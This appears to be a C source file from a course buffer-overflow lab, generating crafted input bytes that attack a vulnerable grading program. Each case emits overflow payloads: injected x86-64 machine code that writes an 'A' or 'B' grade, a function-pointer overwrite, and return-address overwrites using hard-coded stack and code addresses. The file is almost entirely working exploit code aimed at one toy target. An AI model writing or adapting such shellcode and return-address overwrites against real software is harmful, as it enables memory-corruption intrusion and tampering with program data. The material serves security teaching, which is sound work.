/**
 * This program simulates various kinds of buffer overflow attacks.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
  char* output;
  int e_input_size = 100;/*atoi(argv[2])*/;
  int d_input_size = 64;
  int c_input_size = 104;

  if(argc < 2) {
     printf("Usage %s [a/b/c/d/e]\n", argv[0]);
     return 0;
  }

  switch(argv[1][0]) {
     /*e attack: causes segmentation fault*/
     case 'e':
            output = (char*)malloc(sizeof(char)*e_input_size); 
            //output = strdup("You are going to crash... should get an A...... :) about to crash.... \n");
            int i = 0;
            if(!output) {
               perror("Failed to create crash input");
               return -1;
            }
            for(; i < e_input_size; i++) {
              if(i < 5) {
                 output[0] = 'B';
                 output[1] = 'o';
                 output[2] = 'b';
                 output[3] = '\0';
                 output[4] = '\0';
                 i = 5;
              } else 
                 output[i] = '\0';
               fputc(output[i], stdout);
            }
            
            fflush(NULL);
            free(output);
            break;
     /*d attack: prints D grade*/    
     case 'd':
            output = (char*)malloc(sizeof(char)*d_input_size); 
            //output = strdup("You are going to crash... should get an A...... :) about to crash.... \n");
            if(!output) {
               perror("Failed to create crash input");
               return -1;
            }
                 
            for(i = 0; i < d_input_size; i++) {
              if(i < 5) {
               fputc('B', stdout);
               fputc('o', stdout);
               fputc('b', stdout);
               fputc('\0', stdout);
               fputc('\0', stdout);
                 i = 5;
              } else 
                 output[i] = '\0';
               fputc(output[i], stdout);
            }
	    /*Overwrite the fuction address*/
            fputc(0, stdout);
            fputc(7, stdout);
            fputc(0x40, stdout);
            fputc(0x00, stdout);
	    break;
     case 'c':
           fputc('B', stdout);
           fputc('o', stdout);
           fputc('b', stdout);
           fputc('\0', stdout);
           fputc('\0', stdout);
           fputc('\0', stdout);
            fputc('\0', stdout);

            /*
               400835:	be e0 0d 60 00       	mov    $0x600de0,%esi
               40083a:	bf c8 09 40 00       	mov    $0x4009c8,%edi
               40083f:	b8 00 00 00 00       	mov    $0x0,%eax
               400844:	e8 47 fd ff ff       	callq  400590 <printf@plt>
               400849:	be 42 00 00 00  	mov    $0x42,%esi
               400850:	bf f8 09 40 00       	mov    $0x4009f8,%edi
               400855:	b8 00 00 00 00       	mov    $0x0,%eax
               40085a:	e8 31 fd ff ff       	callq  400590 <printf@plt>
  	            	bf 00 00 00 00       	mov    $0x0,%edi
               400584:	e8 77 fe ff ff       	callq  400400 <exit@plt>  
            */
           

            char shell_code[] = { 0xbe, 0xe0, 0x0d, 0x60, 0x00,
                                  0xbf, 0xc8, 0x09, 0x40, 0x00,
                                  0xb8, 0x00, 0x00, 0x00, 0x00,
                                  0xe8, 0x47, 0xfd, 0xff, 0xff,
                                  0xbe, 0x42, 0x00, 0x00, 0x00,
                                  0xbf, 0xf8, 0x09, 0x40, 0x00, 
                                  0xb8, 0x00, 0x00, 0x00, 0x00,
                                  0xe8, 0x31, 0xfd, 0xff, 0xff,
                                  0xbf, 0x00, 0x00, 0x00, 0x00,
                                  0xe8, 0x77, 0xfe, 0xff, 0xff
                                }; 

            for(i = 0; i < 50; i++) {
               fputc(shell_code[i], stdout);
            }  



            for(i = 0; i < 7; i++) {
               fputc('\0', stdout);
            }  

            /*
             0x7fffffffe470:	0x69	0x08	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe478:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe480:	0x10	0x06	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe488:	0x80	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
            */
            char mem_values[] = {
                                   0x69, 0x08, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 
				   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   0x10, 0x06, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0x80, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,
                                   /*0xd8, 0xe4, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00*/
                                   /*0x28, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00*/
                                   0x88, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00
                                  };
            
            for(i = 0; i < 40; i++) { 
               fputc(mem_values[i], stdout);
            }
            // overwrite return address
            fputc(0x2e, stdout);
            fputc(0x08, stdout);
            fputc(0x40, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);

            

	    break;
     case 'b':
	    /*prints B grade*/
            fputc('B', stdout); 
            fputc('o', stdout);
            fputc('b', stdout);
            fputc('\0', stdout);
            fputc('F', stdout);
            fputc('F', stdout);
            fputc('F', stdout);
            
            
            // insert code to put 'B' in grade location and jmp to 0x600de7
            char code[] = { 0x40, 0xb6, 0x42,
                            0x40, 0x88, 0x34, 0x25, 0xa4, 0x0d, 0x60, 0x00,
                            0xc3, 0x00, 0x00, 0x00, 0x01 };  

            for(i = 0; i < 16; i++) {
               fputc(code[i], stdout);
            } 

            fputc('\0', stdout);

            //buffer
            for(i = 0; i < 40; i++) {
               fputc('\0', stdout);
            } 
            
            /*
             0x7fffffffe470:	0x69	0x08	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe478:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe480:	0x10	0x06	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe488:	0x80	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
            */
            char mem_values1[] = {
                                   0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00//, 
				   //0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   //0x10, 0x06, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   //0x80, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,
                                   //0xd8, 0xe4, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00
                                   /*0x28, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00*/
                                   /*0x88, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00*/
                                  };
            
            for(i = 0; i < 8; i++) { 
               fputc(mem_values1[i], stdout);
            }
            // overwrite return address
            /*fputc(0xe7, stdout);
            fputc(0x0d, stdout);
            fputc(0x60, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            */
            break;
      case 'a':
	    /*prints A grade*/
            fputc('B', stdout); 
            fputc('o', stdout);
            fputc('b', stdout);
            fputc('\0', stdout);
            fputc('F', stdout);
            fputc('F', stdout);
            fputc('F', stdout);

            char code3[] = { 0x40, 0xb6, 0x41,
                            0x40, 0x88, 0x34, 0x25, 0xa4, 0x0d, 0x60, 0x00,
                            0xc3, 0x00, 0x00, 0x00, 0x01 };  

            for(i = 0; i < 16; i++) {
               fputc(code3[i], stdout);
            } 

            fputc('\0', stdout);

            //buffer
            for(i = 0; i < 40; i++) {
               fputc('\0', stdout);
            } 
            
            
            /*
             0x7fffffffe470:	0x69	0x08	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe478:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe480:	0x10	0x06	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe488:	0x80	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
            */
	    // randomization part
            char mem_values2[] = {
                                   0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00 
                                   //0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   //0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   //0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                   //0xe7, 0x0d, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00 
                                   //0x28, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00
                                   //0x88, 0xe5, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00*/
                                  };
            
            for(i = 0; i < 39; i++) { 
               fputc(mem_values2[i], stdout);
            }
            // overwrite return address
            /*for(i = 0; i < 4; i++) {
              fputc(0xe7, stdout);
              fputc(0x0d, stdout);
              fputc(0x60, stdout);
              fputc(0x00, stdout);
              fputc(0x00, stdout);
              fputc(0x00, stdout);
              fputc(0x00, stdout);
              fputc(0x00, stdout);
            }*/
            break; 
     case 's':
            
            // print name
            //for(i = 0; i < 6; i++) {
               fputc('B', stdout);
               fputc('o', stdout);
               fputc('b', stdout);
               fputc('\0', stdout);
               fputc('\0', stdout);
               fputc('\0', stdout);
            //}
            fputc('\0', stdout);

            /*
               400835:	be e0 0d 60 00       	mov    $0x600de0,%esi
               40083a:	bf c8 09 40 00       	mov    $0x4009c8,%edi
               40083f:	b8 00 00 00 00       	mov    $0x0,%eax
               400844:	e8 47 fd ff ff       	callq  400590 <printf@plt>
               400849:	be 42 00 00 00  	mov    $0x42,%esi
               400850:	bf f8 09 40 00       	mov    $0x4009f8,%edi
               400855:	b8 00 00 00 00       	mov    $0x0,%eax
               40085a:	e8 31 fd ff ff       	callq  400590 <printf@plt>
  	            	bf 00 00 00 00       	mov    $0x0,%edi
               400584:	e8 77 fe ff ff       	callq  400400 <exit@plt>  
            */
           

            /*char shell_code4[] = { 0xbe, 0xe0, 0x0d, 0x60, 0x00,
                                  0xbf, 0xc8, 0x09, 0x40, 0x00,
                                  0xb8, 0x00, 0x00, 0x00, 0x00,
                                  0xe8, 0x47, 0xfd, 0xff, 0xff,
                                  0xbe, 0x42, 0x00, 0x00, 0x00,
                                  0xbf, 0xf8, 0x09, 0x40, 0x00, 
                                  0xb8, 0x00, 0x00, 0x00, 0x00,
                                  0xe8, 0x31, 0xfd, 0xff, 0xff,
                                  0xbf, 0x00, 0x00, 0x00, 0x00,
                                  0xe8, 0x77, 0xfe, 0xff, 0xff
                                }; */

            for(i = 0; i < 50; i++) {
               fputc('\0', stdout);
            }  



            for(i = 0; i < 7; i++) {
               fputc('\0', stdout);
            }  

            /*
             0x7fffffffe470:	0x69	0x08	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe478:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe480:	0x10	0x06	0x40	0x00	0x00	0x00	0x00	0x00
             0x7fffffffe488:	0x80	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
            */
            char mem_values4[] = {
	0x01,	0x00,	0x00,	0x00,	0x00,	0x00,	0x00,	0x00,
	0x88,	0xe5,	0xff,	0xff,	0xff,	0x7f,	0x00,	0x00,
	0x80,	0xe5,	0xff,	0xff,	0xff,	0x7f,	0x00,	0x00,
	0x00,	0x00,	0x00,	0x00,	0x00,	0x00,	0x00,	0x00,
	0x30,	0x08,	0x40,	0x00,	0x00,	0x00,	0x00,	0x00
                                  };
            
            for(i = 0; i < 40; i++) { 
               fputc(mem_values4[i], stdout);
            }
            // overwrite return address
            fputc(0x8b, stdout);
            fputc(0x29, stdout);
            fputc(0x40, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);
            fputc(0x00, stdout);

           break;
     default:
	   printf("Invalid input\n");

  }
  
  return 0;
}
